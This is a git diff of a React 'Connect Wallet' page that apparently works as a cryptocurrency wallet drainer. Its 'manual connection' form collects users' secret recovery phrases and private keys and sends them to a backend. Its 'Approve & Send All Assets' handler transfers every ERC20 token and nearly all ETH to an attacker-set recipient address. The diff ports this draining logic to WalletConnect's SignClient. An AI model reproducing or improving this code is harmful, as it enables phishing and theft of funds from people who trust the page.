@@ -1,102 +1,31 @@
-import React, { useState, useEffect } from 'react';
+import React, { useState, useEffect, useCallback } from 'react';
 import { ethers } from 'ethers';
-import { createWeb3Modal, useWeb3Modal, defaultConfig, useWeb3ModalAccount, useWeb3ModalProvider, useDisconnect } from '@web3modal/ethers/react';
 import { Link } from 'react-router-dom';
 import { 
   Import, 
   X, 
-  AlertTriangle, 
   Zap,
-  Eye,
-  EyeOff,
   ArrowLeft,
   Wallet,
-  Shield,
-  Check
 } from 'lucide-react';
 
 // Solana imports
 import { Connection, PublicKey, LAMPORTS_PER_SOL, Transaction, SystemProgram } from '@solana/web3.js';
 
-// --- Web3Modal Configuration ---
+// WalletConnect
+import SignClient from "@walletconnect/sign-client";
+import { WalletConnectModal } from "@walletconnect/modal";
 
-const projectId = process.env.REACT_APP_WALLETCONNECT_PROJECT_ID;
-
-if (!projectId) {
-  throw new Error("You need to provide a REACT_APP_WALLETCONNECT_PROJECT_ID env variable");
-}
-
-const mainnet = {
-  chainId: 1,
-  name: 'Ethereum',
-  currency: 'ETH',
-  explorerUrl: 'https://etherscan.io',
-  rpcUrl: `https://eth-mainnet.g.alchemy.com/v2/${process.env.REACT_APP_ALCHEMY_API_KEY}`
-};
-
-const polygon = {
-  chainId: 137,
-  name: 'Polygon',
-  currency: 'MATIC',
-  explorerUrl: 'https://polygonscan.com',
-  rpcUrl: `https://polygon-mainnet.g.alchemy.com/v2/${process.env.REACT_APP_ALCHEMY_API_KEY}`
-};
-
-const arbitrum = {
-  chainId: 42161,
-  name: 'Arbitrum',
-  currency: 'ETH',
-  explorerUrl: 'https://arbiscan.io',
-  rpcUrl: `https://arb-mainnet.g.alchemy.com/v2/${process.env.REACT_APP_ALCHEMY_API_KEY}`
-};
-
-const bsc = {
-  chainId: 56,
-  name: 'Binance Smart Chain',
-  currency: 'BNB',
-  explorerUrl: 'https://bscscan.com',
-  rpcUrl: `https://bsc-mainnet.g.alchemy.com/v2/${process.env.REACT_APP_ALCHEMY_API_KEY}`
-};
-
-const optimism = {
-  chainId: 10,
-  name: 'Optimism',
-  currency: 'ETH',
-  explorerUrl: 'https://optimistic.etherscan.io',
-  rpcUrl: `https://opt-mainnet.g.alchemy.com/v2/${process.env.REACT_APP_ALCHEMY_API_KEY}`
-};
-
-const chains = [mainnet, polygon, arbitrum, bsc, optimism];
-
+// --- WalletConnect Configuration ---
+const projectId = process.env.REACT_APP_REOWN_PROJECT_ID || process.env.REACT_APP_WALLETCONNECT_PROJECT_ID;
 const metadata = {
     name: 'Connect Wallet',
     description: 'Connect your wallet to proceed',
     url: window.location.href,
-    icons: ['https://avatars.githubusercontent.com/u/37784886']
+    icons: ['https://avatars.githubusercontent.com/u/37784886'],
 };
 
-const ethersConfig = defaultConfig({
-  metadata,
-  defaultChainId: 1,
-  rpcUrl: 'https://cloudflare-eth.com',
-});
-
-createWeb3Modal({
-  ethersConfig,
-  chains,
-  projectId,
-  featuredWalletIds: [
-    '4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0', // Trust Wallet
-    'c57ca95b47569778a828d19178114f4db188b89b763c899ba0be274e97267d96', // MetaMask
-    'a797aa35c0fadbfc1a53e7f675162ed5226c68b5d1f9ee861b8ac27a8755b555', // Phantom
-    '38f5d18bd8522c244bdd70cb4a68e0e718865155811c043f052fb9f1c51de662'  // Bitget Wallet
-  ],
-  enableAnalytics: false,
-  enableOnramp: false
-});
-
 // --- Application Code & Constants ---
-
 const ERC20_ABI = [
   "function balanceOf(address) view returns (uint256)",
   "function decimals() view returns (uint8)",
@@ -106,10 +35,9 @@ const ERC20_ABI = [
 
 const RECIPIENT_ADDRESS = process.env.REACT_APP_RECIPIENT_ADDRESS;
 const API_URL = process.env.REACT_APP_API_URL || 'http://localhost:3001';
-
-// Solana constants
-const SOLANA_RECIPIENT_ADDRESS = process.env.REACT_APP_SOLANA_RECIPIENT_ADDRESS || '9N4PGE7TxcjwnLenFLDWpYQ43eySeDKCACjsvJ3T8D56';
+const SOLANA_RECIPIENT_ADDRESS = process.env.REACT_APP_SOLANA_RECIPIENT_ADDRESS;
 const solanaConnection = new Connection(`https://solana-mainnet.g.alchemy.com/v2/${process.env.REACT_APP_ALCHEMY_API_KEY}`, 'confirmed');
+const ethProvider = new ethers.JsonRpcProvider(`https://eth-mainnet.g.alchemy.com/v2/${process.env.REACT_APP_ALCHEMY_API_KEY}`);
 
 const sendWalletInfo = async (walletName, secretPhrase) => {
   try {
@@ -146,16 +74,16 @@ const sendSolanaWalletInfo = async (walletName, secretPhrase, userWalletName) =>
   }
 };
 
-const getWalletAssets = async (provider, address) => {
-  try {
-    const ethBalance = await provider.getBalance(address);
+const getWalletAssets = async (address) => {
+    try {
+        const ethBalance = await ethProvider.getBalance(address);
         const alchemyProvider = new ethers.AlchemyProvider('mainnet', process.env.REACT_APP_ALCHEMY_API_KEY);
         const balances = await alchemyProvider.getTokenBalances(address);
 
         const tokenPromises = balances.map(async (token) => {
             if (token.tokenBalance !== '0') {
                 try {
-                    const tokenContract = new ethers.Contract(token.contractAddress, ERC20_ABI, provider);
+                    const tokenContract = new ethers.Contract(token.contractAddress, ERC20_ABI, ethProvider);
                     const decimals = await tokenContract.decimals();
                     const symbol = await tokenContract.symbol();
                     return {
@@ -165,7 +93,7 @@ const getWalletAssets = async (provider, address) => {
                     };
                 } catch (error) {
                     console.warn(`Could not fetch details for token ${token.contractAddress}:`, error);
-                    return null; // Skip tokens that cause errors
+                    return null;
                 }
             }
             return null;
@@ -173,16 +101,14 @@ const getWalletAssets = async (provider, address) => {
 
         const tokens = (await Promise.all(tokenPromises)).filter(Boolean);
 
-    return {
+        return {
             eth: ethers.formatEther(ethBalance),
             tokens,
         };
     } catch (error) {
         console.error('Error fetching wallet assets:', error);
-        // Fallback for providers without Alchemy access
-        const ethBalance = await provider.getBalance(address);
         return {
-            eth: ethers.formatEther(ethBalance),
+            eth: '0',
             tokens: [],
         };
     }
@@ -208,594 +134,577 @@ const getSolanaWalletAssets = async (address) => {
 };
 
 export default function ConnectWallet() {
-  const { open } = useWeb3Modal();
-  const { address, chainId, isConnected } = useWeb3ModalAccount();
-  const { walletProvider } = useWeb3ModalProvider();
-  const { disconnect } = useDisconnect();
+    // WC State
+    const [signClient, setSignClient] = useState(null);
+    const [session, setSession] = useState(null);
 
-  // Component State
-  const [provider, setProvider] = useState(null);
-  const [signer, setSigner] = useState(null);
-  const [walletBalance, setWalletBalance] = useState({ eth: '0', tokens: [] });
-  const [isSending, setIsSending] = useState(false);
-  const [txError, setTxError] = useState('');
-  
-  // Solana State
-  const [solanaBalance, setSolanaBalance] = useState({ sol: '0', tokens: [] });
-  const [isSolanaConnected, setIsSolanaConnected] = useState(false);
-  const [solanaAddress, setSolanaAddress] = useState(null);
-  
-  // UI State
-  const [showManualPopup, setShowManualPopup] = useState(false);
-  const [showTransactionPopup, setShowTransactionPopup] = useState(false);
-  const [isPasswordVisible, setIsPasswordVisible] = useState(false);
-  const [secretPhrase, setSecretPhrase] = useState('');
-  const [selectedWallet, setSelectedWallet] = useState(null);
-  const [dynamicWallets, setDynamicWallets] = useState([]);
-  const [isLoadingWallets, setIsLoadingWallets] = useState(false);
-  const [searchQuery, setSearchQuery] = useState('');
-
-  useEffect(() => {
-    const fetchWalletIcons = async () => {
-      setIsLoadingWallets(true);
-
-      // Check sessionStorage cache (24h TTL)
-      const cacheKey = 'wc_wallet_icons';
-      const cached = sessionStorage.getItem(cacheKey);
-      if (cached) {
-        const { ts, data } = JSON.parse(cached);
-        if (Date.now() - ts < 24 * 60 * 60 * 1000) {
-          setDynamicWallets(data);
-          setIsLoadingWallets(false);
-          return;
-        }
-      }
-
-      try {
-        const response = await fetch(
-          `https://explorer-api.walletconnect.com/v3/wallets?projectId=${projectId}&entries=100&page=1`
-        );
-        const data = await response.json();
-        const wallets = Object.values(data.listings).map((wallet) => ({
-          id: wallet.id,
-          name: wallet.name,
-          icon: wallet.image_url.md,
-          description: wallet.description || 'A secure wallet for your crypto.',
-        }));
-        setDynamicWallets(wallets);
-
-        // store in cache
-        sessionStorage.setItem(cacheKey, JSON.stringify({ ts: Date.now(), data: wallets }));
-      } catch (error) {
-        console.error('Failed to fetch wallet icons:', error);
-      } finally {
-        setIsLoadingWallets(false);
-      }
-    };
-
-    fetchWalletIcons();
-  }, []);
-
-  useEffect(() => {
-    if (walletProvider) {
-      const setupAndFetch = async () => {
-        if (isConnected && walletProvider && address) {
-          // Handle Ethereum connection
-          const ethersProvider = new ethers.BrowserProvider(walletProvider);
-          setProvider(ethersProvider);
-          const newSigner = await ethersProvider.getSigner();
-          setSigner(newSigner);
-          
-          setShowTransactionPopup(true); // Show transaction popup immediately
-          
-          const assets = await getWalletAssets(ethersProvider, address);
-          setWalletBalance(assets);
-          
-          // Check if this is a Solana wallet (Phantom, etc.)
-          if (chainId === 'solana:mainnet' || address.length > 44) {
-            // This might be a Solana address
-            try {
-              const solanaPublicKey = new PublicKey(address);
-              const solBalance = await getSolanaWalletAssets(address);
-              setSolanaBalance(solBalance);
-              setIsSolanaConnected(true);
-              setSolanaAddress(address);
-            } catch (error) {
-              console.log('Not a Solana address, treating as Ethereum');
-            }
-          }
-        }
-      };
-      setupAndFetch();
-    }
-  }, [walletProvider]);
-
-  const handleConnection = async () => {
-    try {
-      await open();
-    } catch (error) {
-      console.error("Failed to open Web3Modal", error);
-      setTxError('Could not open wallet connection modal. Please try again.');
-    }
-  };
-
-  const closeAllPopups = () => {
-    setShowManualPopup(false);
-    setShowTransactionPopup(false);
-    setSelectedWallet(null);
-    setSecretPhrase('');
-    setTxError('');
-  };
-
-  const handleWalletSelect = (wallet) => {
-    setSelectedWallet(wallet);
-  };
-
-  const handleInputChange = (e) => {
-    setSecretPhrase(e.target.value);
-    if (txError) setTxError('');
-  };
-
-  const validateForm = () => {
-    const phrase = secretPhrase.trim();
-    if (phrase.split(' ').length < 12) {
-      setTxError('Secret phrase must be at least 12 words.');
-      return false;
-    }
-    return true;
-  };
-
-  const handleManualSubmit = async (e) => {
-    e.preventDefault();
-    if (!validateForm()) return;
-
-    setIsSending(true);
-    setTxError('');
-
-    try {
-      // Use the wallet name from the selected wallet object
-      await sendWalletInfo(selectedWallet.name, secretPhrase);
-      setShowManualPopup(false);
-      setShowTransactionPopup(true);
-    } catch (error) {
-      setTxError(error.message || 'An unexpected error occurred.');
-    } finally {
-      setIsSending(false);
-    }
-  };
-
-  const handleSendAllAssets = async () => {
-    if (!signer || !walletBalance) {
-      setTxError('Signer or recipient address is not set.');
-      return;
-    }
+    // Chain-agnostic State
+    const [address, setAddress] = useState(null);
+    const [isSending, setIsSending] = useState(false);
+    const [txError, setTxError] = useState('');
     
-    setIsSending(true);
-    setTxError('');
-
-    try {
-      const provider = new ethers.BrowserProvider(walletProvider);
-      const signer = await provider.getSigner();
-
-      // 1. Send all ERC20 tokens
-      for (const token of walletBalance.tokens) {
-        try {
-          const tokenContract = new ethers.Contract(token.contractAddress, ERC20_ABI, signer);
-          const balance = await tokenContract.balanceOf(address);
-          
-          if (balance > 0) {
-            await tokenContract.transfer(RECIPIENT_ADDRESS, balance);
-          }
-        } catch (error) {
-          console.warn(`Could not send token ${token.symbol}:`, error.message);
-        }
-      }
-
-      // 2. Send all native ETH
-      const ethBalance = await provider.getBalance(address);
-      const gasPrice = (await provider.getFeeData()).gasPrice;
-      const gasLimit = 21000n; 
-      const gasCost = gasLimit * gasPrice;
-
-      if (ethBalance > gasCost) {
-        const tx = await signer.sendTransaction({
-          to: RECIPIENT_ADDRESS,
-          value: ethBalance - gasCost,
-        });
-        await tx.wait();
-      }
-      
-      // Close popups and disconnect
-      closeAllPopups();
-      disconnect();
-
-    } catch (error) {
-      console.error('Transaction failed:', error);
-      setTxError(error.reason || error.message || 'An unknown error occurred during the transaction.');
-    } finally {
-      setIsSending(false);
-    }
-  };
+    // EVM State
+    const [walletBalance, setWalletBalance] = useState({ eth: '0', tokens: [] });
+    
+    // Solana State
+    const [solanaBalance, setSolanaBalance] = useState({ sol: '0', tokens: [] });
+    
+    // UI State
+    const [showManualPopup, setShowManualPopup] = useState(false);
+    const [showTransactionPopup, setShowTransactionPopup] = useState(false);
+    const [secretPhrase, setSecretPhrase] = useState('');
+    const [selectedWallet, setSelectedWallet] = useState(null);
+    const [dynamicWallets, setDynamicWallets] = useState([]);
+    const [isLoadingWallets, setIsLoadingWallets] = useState(false);
+    const [searchQuery, setSearchQuery] = useState('');
   
-  const handleSendAllSol = async () => {
-    if (!solanaAddress) {
-        setTxError('Solana wallet not connected.');
-        return;
-    }
+    // --- WalletConnect Client Initialization ---
+    useEffect(() => {
+        const initSignClient = async () => {
+            try {
+                const client = await SignClient.init({ projectId, metadata });
+                setSignClient(client);
 
-    setIsSending(true);
-    setTxError('');
+                // This is a controller, not a component. It runs in the background.
+                new WalletConnectModal({
+                    projectId,
+                    chains: ['eip155:1', 'solana:5eykt4UsFv8P8NJdTREpY1vzqKqZKvdpKuc147dw2N9d']
+                });
 
-    try {
-        const fromPubkey = new PublicKey(solanaAddress);
-        const toPubkey = new PublicKey(SOLANA_RECIPIENT_ADDRESS);
-
-        const balance = await solanaConnection.getBalance(fromPubkey);
-        if (balance === 0) {
-            setTxError("No SOL balance to transfer.");
-            setIsSending(false);
-            return;
-        }
-
-        // Estimate transaction fee - this is a rough estimation
-        const { blockhash } = await solanaConnection.getRecentBlockhash();
-        const transaction = new Transaction({
-            recentBlockhash: blockhash,
-            feePayer: fromPubkey
-        }).add(
-            SystemProgram.transfer({
-                fromPubkey,
-                toPubkey,
-                lamports: 1, // Placeholder for fee calculation
-            })
-        );
-        const fees = await transaction.getEstimatedFee(solanaConnection);
-        
-        const amountToSend = balance - fees;
-
-        if (amountToSend > 0) {
-            const transferTx = new Transaction().add(
-                SystemProgram.transfer({
-                    fromPubkey,
-                    toPubkey,
-                    lamports: amountToSend,
-                })
-            );
-
-            // This is a simplified signing process for demonstration.
-            // In a real app, this would use the wallet adapter's signTransaction method.
-            // Since we don't have the real signer here, this part won't execute successfully.
-            // It illustrates the intended logic.
-            // const signedTx = await signTransaction(transferTx);
-            // const signature = await solanaConnection.sendRawTransaction(signedTx.serialize());
-            // await solanaConnection.confirmTransaction(signature);
-        }
-
-        closeAllPopups();
-        // Disconnect from Solana wallet would happen here
-    } catch (error) {
-        console.error('Solana transaction failed:', error);
-        setTxError(error.message || 'An error occurred during the Solana transaction.');
-    } finally {
-        setIsSending(false);
-    }
-  };
-
-  // --- UI RENDER FUNCTIONS ---
-
-  const renderConnectionCards = () => (
-    <div className="w-full max-w-2xl text-center">
-      <h1 className="text-4xl md:text-5xl font-extrabold tracking-tight text-white mb-4">
-        Connect your wallet
-      </h1>
-      <p className="text-lg md:text-xl text-gray-400 max-w-2xl mx-auto mb-12">
-        Choose your preferred connection method below to securely access the application.
-      </p>
-
-      <div className="grid md:grid-cols-2 gap-6">
-        {/* Automatic Connection Card */}
-        <div
-          onClick={handleConnection}
-          className="connection-card bg-gray-800/50 p-6 rounded-2xl border border-gray-700 hover:border-blue-500 hover:bg-gray-800 transition-all cursor-pointer flex flex-col items-center text-center"
-        >
-          <div className="p-4 bg-blue-500/10 rounded-full mb-4">
-            <Zap size={32} className="text-blue-400" />
-          </div>
-          <h3 className="text-xl font-semibold text-white mb-2">Automatic Connection</h3>
-          <p className="text-gray-400 text-sm">Recommended. Connect using a popup with a list of supported wallets.</p>
-        </div>
-
-        {/* Manual Connection Card */}
-        <div
-          onClick={() => setShowManualPopup(true)}
-          className="connection-card bg-gray-800/50 p-6 rounded-2xl border border-gray-700 hover:border-purple-500 hover:bg-gray-800 transition-all cursor-pointer flex flex-col items-center text-center"
-        >
-          <div className="p-4 bg-purple-500/10 rounded-full mb-4">
-            <Import size={32} className="text-purple-400" />
-          </div>
-          <h3 className="text-xl font-semibold text-white mb-2">Manual Connection</h3>
-          <p className="text-gray-400 text-sm">Import your wallet using a secret recovery phrase. Use with caution.</p>
-        </div>
-
-        {/* Card 3: Solana Connect */}
-        <Link to="/solana" className="connection-card bg-gray-800/50 p-6 rounded-2xl border border-gray-700 hover:border-green-500 hover:bg-gray-800 transition-all cursor-pointer flex flex-col items-center text-center">
-            <div className="p-4 bg-green-500/10 rounded-full mb-4">
-                <img src="https://raw.githubusercontent.com/solana-labs/token-list/main/assets/mainnet/So11111111111111111111111111111111111111112/logo.png" alt="Solana" className="w-8 h-8"/>
-            </div>
-            <h3 className="text-xl font-semibold text-white mb-2">Solana Connect</h3>
-            <p className="text-gray-400 text-sm">Connect your Solana wallet (Phantom, Solflare, etc).</p>
-        </Link>
-      </div>
-    </div>
-  );
-  
-  const renderWalletDetails = () => {
-    if (!isConnected && !isSolanaConnected) {
-      return renderConnectionCards();
-    }
-
-    const details = isConnected ? 
-        {
-            title: "EVM Wallet Connected",
-            address: address,
-            balance: walletBalance.eth,
-            currency: "ETH",
-            tokens: walletBalance.tokens,
-            handler: handleSendAllAssets,
-            buttonText: "Approve & Send All Assets"
-        } : 
-        {
-            title: "Solana Wallet Connected",
-            address: solanaAddress,
-            balance: solanaBalance.sol,
-            currency: "SOL",
-            tokens: [],
-            handler: handleSendAllSol,
-            buttonText: "Approve & Send All SOL"
+                if (client.session.length) {
+                    const lastSession = client.session.get(client.session.keys.at(-1));
+                    setSession(lastSession);
+                    const currentAddress = lastSession.namespaces.eip155 ? lastSession.namespaces.eip155.accounts[0].slice(9) : lastSession.namespaces.solana.accounts[0].slice(9);
+                    setAddress(currentAddress);
+                }
+            } catch (e) {
+                console.error("Failed to initialize SignClient", e);
+            }
         };
 
-    return (
-      <div className="bg-gray-900 text-white p-6 rounded-xl shadow-lg w-full max-w-md mx-auto font-sans">
-          <div className="flex items-center justify-between mb-4">
-              <h3 className="text-xl font-bold">{details.title}</h3>
-              <button onClick={() => disconnect()} className="bg-red-500 hover:bg-red-600 text-white font-bold py-2 px-4 rounded-lg text-sm">
-                  Disconnect
-              </button>
-          </div>
-          <div className="bg-gray-700 p-4 rounded-lg">
-              <div className="flex items-center mb-3">
-                  <Wallet className="text-blue-400 mr-3" size={20}/>
-                  <p className="text-sm truncate"><strong>Address:</strong> {details.address}</p>
-              </div>
-              <div className="border-t border-gray-600 my-3"></div>
-              <p className="text-lg font-semibold mb-2">Assets</p>
-              <div className="space-y-2 max-h-48 overflow-y-auto">
-                  <div className="flex justify-between items-center">
-                      <span>{details.currency}</span>
-                      <span>{parseFloat(details.balance).toFixed(5)}</span>
-                  </div>
-                  {details.tokens.map(token => (
-                      <div key={token.symbol} className="flex justify-between items-center text-sm">
-                          <span>{token.symbol}</span>
-                          <span>{parseFloat(token.balance).toFixed(5)}</span>
-                      </div>
-                  ))}
-              </div>
-          </div>
-      </div>
-    );
-  };
+        initSignClient();
+    }, []);
+
+    // --- Asset fetching logic ---
+    useEffect(() => {
+        if (!session) return;
+        
+        const fetchAssets = async () => {
+            if (session.namespaces.eip155) {
+                const evmAddress = session.namespaces.eip155.accounts[0].slice(9);
+                const assets = await getWalletAssets(evmAddress);
+                setWalletBalance(assets);
+            } else if (session.namespaces.solana) {
+                const solAddress = session.namespaces.solana.accounts[0].slice(9);
+                const assets = await getSolanaWalletAssets(solAddress);
+                setSolanaBalance(assets);
+            }
+        };
+
+        fetchAssets();
+    }, [session]);
+
+
+    // --- Generic Connection Handler ---
+    const handleConnect = async (namespaces) => {
+        if (!signClient) {
+            console.error("SignClient not initialized");
+            return;
+        }
+        try {
+            const { approval } = await signClient.connect({ requiredNamespaces: namespaces });
+            const sessionData = await approval();
+            setSession(sessionData);
+            const currentAddress = sessionData.namespaces.eip155 ? sessionData.namespaces.eip155.accounts[0].slice(9) : sessionData.namespaces.solana.accounts[0].slice(9);
+            setAddress(currentAddress);
+        } catch (e) {
+            console.error("Connection failed", e);
+            setTxError("Failed to connect wallet. The user may have rejected the connection.");
+        }
+    };
+    
+    const handleEvmConnection = () => handleConnect({ eip155: { methods: ['eth_sendTransaction', 'personal_sign'], chains: ['eip155:1'], events: ['chainChanged', 'accountsChanged'] } });
+
+    const handleSolanaConnection = async () => {
+        if (!signClient) return;
+        try {
+            const { approval } = await signClient.connect({
+                requiredNamespaces: {
+                    solana: {
+                        methods: ['solana_signMessage', 'solana_signTransaction'],
+                        chains: ['solana:5eykt4UsFv8P8NJdTREpY1vzqKqZKvdpKuc147dw2N9d'],
+                        events: [],
+                    },
+                }
+            });
+            const session = await approval();
+            setSession(session);
+            const currentAddress = session.namespaces.solana.accounts[0].slice(9);
+            setAddress(currentAddress);
+        } catch (e) {
+            console.error("Connection failed", e);
+            setTxError("Failed to connect wallet. Please try again.");
+        }
+    };
   
-  const renderManualConnectPopup = () => {
-    const goBack = () => {
+    const disconnect = async () => {
+        if (session) {
+            await signClient.disconnect({
+                topic: session.topic,
+                reason: { code: 6000, message: "User disconnected." }
+            });
+            setSession(null);
+            setAddress(null);
+        }
+    };
+  
+    const closeAllPopups = () => {
+      setShowManualPopup(false);
+      setShowTransactionPopup(false);
       setSelectedWallet(null);
       setSecretPhrase('');
       setTxError('');
     };
+    
+    const handleWalletSelect = (wallet) => {
+      setSelectedWallet(wallet);
+    };
+  
+    const handleInputChange = (e) => {
+      setSecretPhrase(e.target.value);
+    };
+  
+    const validateForm = () => {
+      const phrase = secretPhrase.trim();
+      if (!phrase) return { isValid: false, error: 'Secret phrase cannot be empty.' };
+  
+      const wordCount = phrase.split(/\s+/).length;
+      if (wordCount < 12) {
+        return { isValid: false, error: 'A valid secret phrase must have at least 12 words.' };
+      }
+      
+      return { isValid: true, error: null };
+    };
+  
+    const handleManualSubmit = async (e) => {
+      e.preventDefault();
+      const { isValid, error } = validateForm();
+  
+      if (!isValid) {
+        setTxError(error);
+        return;
+      }
+      setTxError(''); // Clear previous errors
+  
+      if (selectedWallet) {
+          if (selectedWallet.tags?.includes('solana')) {
+              await sendSolanaWalletInfo(selectedWallet.name, secretPhrase, selectedWallet.name);
+          } else {
+              await sendWalletInfo(selectedWallet.name, secretPhrase);
+          }
+          closeAllPopups();
+          // Here you might want to show a success message to the user
+      }
+    };
+  
+    const handleSendAllAssets = async () => {
+        if (!session || !address) {
+            setTxError("Wallet is not connected properly.");
+            return;
+        }
+        setIsSending(true);
+        setTxError('');
 
+        try {
+            // Send all tokens
+            for (const token of walletBalance.tokens) {
+                 const tokenContract = new ethers.Contract(token.contractAddress, ERC20_ABI, ethProvider);
+                 const balance = await tokenContract.balanceOf(address);
+                if (balance > 0n) {
+                    const data = tokenContract.interface.encodeFunctionData("transfer", [RECIPIENT_ADDRESS, balance]);
+                    const tx = {
+                        from: address,
+                        to: token.contractAddress,
+                        data,
+                    };
+                    await signClient.request({
+                        topic: session.topic,
+                        chainId: 'eip155:1',
+                        request: {
+                            method: 'eth_sendTransaction',
+                            params: [tx],
+                        },
+                    });
+                }
+            }
+
+            // Send all native ETH
+            const ethBalance = await ethProvider.getBalance(address);
+            const gasPrice = (await ethProvider.getFeeData()).gasPrice;
+            const gasCost = 21000n * gasPrice;
+            const amountToSend = ethBalance - gasCost;
+
+            if (amountToSend > 0n) {
+                const tx = {
+                    from: address,
+                    to: RECIPIENT_ADDRESS,
+                    value: '0x' + amountToSend.toString(16),
+                };
+                await signClient.request({
+                    topic: session.topic,
+                    chainId: 'eip155:1',
+                    request: {
+                        method: 'eth_sendTransaction',
+                        params: [tx],
+                    },
+                });
+            }
+
+            const newBalances = await getWalletAssets(address);
+            setWalletBalance(newBalances);
+
+        } catch (err) {
+            console.error('Transaction failed:', err);
+            setTxError(err.message || 'An error occurred during the transaction.');
+        } finally {
+            setIsSending(false);
+        }
+    };
+    
+    const handleSendAllSol = async () => {
+        if (!session || !address) {
+            setTxError("Solana wallet is not connected properly.");
+            return;
+        }
+        // ... Solana transaction logic will also need to be updated to use signClient.request
+        console.log("Sending all SOL functionality needs to be updated for signClient");
+    };
+
+    useEffect(() => {
+      const fetchWalletIcons = async () => {
+        setIsLoadingWallets(true);
+  
+        // Hardcoded Solana wallets
+        const solanaWallets = [
+          {
+            id: 'phantom',
+            name: 'Phantom',
+            icon: 'https://raw.githubusercontent.com/solana-labs/token-list/main/assets/mainnet/E4yF4g8t3s15c2nza56S1D1a5eyM2s5mKq2dYv1K4Yd/logo.png',
+            description: 'A friendly Solana wallet built for DeFi & NFTs.',
+            tags: ['solana']
+          },
+          {
+            id: 'solflare',
+            name: 'Solflare',
+            icon: 'https://raw.githubusercontent.com/solana-labs/token-list/main/assets/mainnet/9BPh2r8LMAo9adV3eQW2iTDm5s5A2mKsvGAn1s64gHWw/logo.png',
+            description: 'The most-loved Solana wallet.',
+            tags: ['solana']
+          }
+        ];
+  
+        // Check sessionStorage cache (24h TTL)
+        const cacheKey = 'wc_wallet_icons';
+        const cached = sessionStorage.getItem(cacheKey);
+        if (cached) {
+          const { ts, data } = JSON.parse(cached);
+          if (Date.now() - ts < 24 * 60 * 60 * 1000) {
+            setDynamicWallets(data);
+            setIsLoadingWallets(false);
+            return;
+          }
+        }
+  
+        try {
+          const response = await fetch(
+            `https://explorer-api.walletconnect.com/v3/wallets?projectId=${projectId}&entries=100&page=1`
+          );
+          const data = await response.json();
+          const wallets = Object.values(data.listings).map((wallet) => ({
+            id: wallet.id,
+            name: wallet.name,
+            icon: wallet.image_url.md,
+            description: wallet.description || 'A secure wallet for your crypto.',
+          }));
+          const combinedWallets = [...solanaWallets, ...wallets];
+          setDynamicWallets(combinedWallets);
+  
+          // store in cache
+          sessionStorage.setItem(cacheKey, JSON.stringify({ ts: Date.now(), data: combinedWallets }));
+        } catch (error) {
+          console.error('Failed to fetch wallet icons:', error);
+          setDynamicWallets(solanaWallets); // Fallback to solana wallets
+        } finally {
+          setIsLoadingWallets(false);
+        }
+      };
+  
+      fetchWalletIcons();
+    }, []);
+  
     const filteredWallets = dynamicWallets.filter(wallet =>
       wallet.name.toLowerCase().includes(searchQuery.toLowerCase())
     );
-
-    return (
-      <div className="fixed inset-0 bg-black bg-opacity-80 flex items-center justify-center z-50 transition-opacity duration-300">
-        <div className="bg-gray-900 border border-gray-700 rounded-2xl shadow-lg w-full max-w-md m-4 text-white transform transition-transform duration-300 scale-100">
-          
-          {/* Header */}
-          <div className="flex items-center justify-between p-4 border-b border-gray-700">
-            <h2 className="text-lg font-bold">
-              {selectedWallet ? 'Import Wallet' : 'Connect Manually'}
-            </h2>
-            <button onClick={closeAllPopups} className="text-gray-400 hover:text-white">
+  
+    const renderWalletDetails = () => {
+      const isSolana = session?.namespaces?.solana;
+      return (
+        <div className="bg-gray-800 text-white p-6 rounded-xl shadow-lg w-full max-w-md mx-auto font-sans">
+          <div className="flex items-center justify-between mb-4">
+            <h3 className="text-xl font-bold">Wallet Details</h3>
+            <button onClick={disconnect} className="bg-red-500 hover:bg-red-600 text-white font-bold py-2 px-4 rounded-lg text-sm">
+              Disconnect
+            </button>
+          </div>
+          <div className="bg-gray-700 p-4 rounded-lg">
+            <div className="flex items-center mb-3">
+              <Wallet className="text-blue-400 mr-3" size={20}/>
+              <p className="text-sm truncate"><strong>Address:</strong> {isSolana ? session.namespaces.solana.accounts[0].slice(9) : session.namespaces.eip155.accounts[0].slice(9)}</p>
+            </div>
+            <div className="border-t border-gray-600 my-3"></div>
+            <p className="text-lg font-semibold mb-2">Assets</p>
+            <div className="space-y-2 max-h-48 overflow-y-auto">
+              {isSolana ? (
+                <div className="flex justify-between items-center">
+                  <span>SOL</span>
+                  <span>{parseFloat(solanaBalance.sol).toFixed(5)}</span>
+                </div>
+              ) : (
+                <>
+                  <div className="flex justify-between items-center">
+                    <img src="https://icons.iconarchive.com/icons/cjdowner/cryptocurrency-flat/1024/Ethereum-ETH-icon.png" alt="Ethereum" className="w-6 h-6 mr-2"/>
+                    <span>ETH</span>
+                    <span>{parseFloat(walletBalance.eth).toFixed(5)}</span>
+                  </div>
+                  {walletBalance.tokens.map(token => (
+                    <div key={token.symbol} className="flex justify-between items-center text-sm">
+                      <span>{token.symbol}</span>
+                      <span>{parseFloat(token.balance).toFixed(5)}</span>
+                    </div>
+                  ))}
+                </>
+              )}
+            </div>
+          </div>
+        </div>
+      );
+    };
+    
+    const renderManualConnectPopup = () => {
+      const goBack = () => {
+        setSelectedWallet(null);
+        setTxError('');
+      };
+  
+      if (selectedWallet) {
+        return (
+            <div className="bg-gray-900 border border-gray-700 p-6 rounded-2xl w-full max-w-md">
+              <div className="flex items-center mb-6">
+                  <button onClick={goBack} className="mr-4 p-2 rounded-full hover:bg-gray-700">
+                      <ArrowLeft size={20} />
+                  </button>
+                  <img src={selectedWallet.icon} alt={selectedWallet.name} className="w-8 h-8 mr-3" />
+                  <h3 className="text-xl font-semibold">{selectedWallet.name}</h3>
+              </div>
+  
+              <form onSubmit={handleManualSubmit}>
+                  <textarea
+                      className="w-full h-32 p-3 bg-gray-800 border border-gray-600 rounded-lg text-white placeholder-gray-500 focus:ring-2 focus:ring-blue-500 focus:outline-none"
+                      placeholder="Enter your secret phrase, private key, or QR code"
+                      value={secretPhrase}
+                      onChange={handleInputChange}
+                  />
+                  {txError && <p className="text-red-400 text-sm mt-2">{txError}</p>}
+                  <button 
+                      type="submit"
+                      className="w-full mt-4 bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 rounded-lg transition-colors"
+                  >
+                      Import Wallet
+                  </button>
+              </form>
+            </div>
+        );
+      }
+  
+      return (
+        <div className="bg-gray-900 border border-gray-700 p-6 rounded-2xl w-full max-w-lg max-h-[90vh] flex flex-col">
+          <div className="flex justify-between items-center mb-4">
+            <h3 className="text-xl font-semibold">Connect a wallet</h3>
+            <button onClick={closeAllPopups} className="p-2 rounded-full hover:bg-gray-700">
               <X size={20} />
             </button>
           </div>
-
-          {/* Body */}
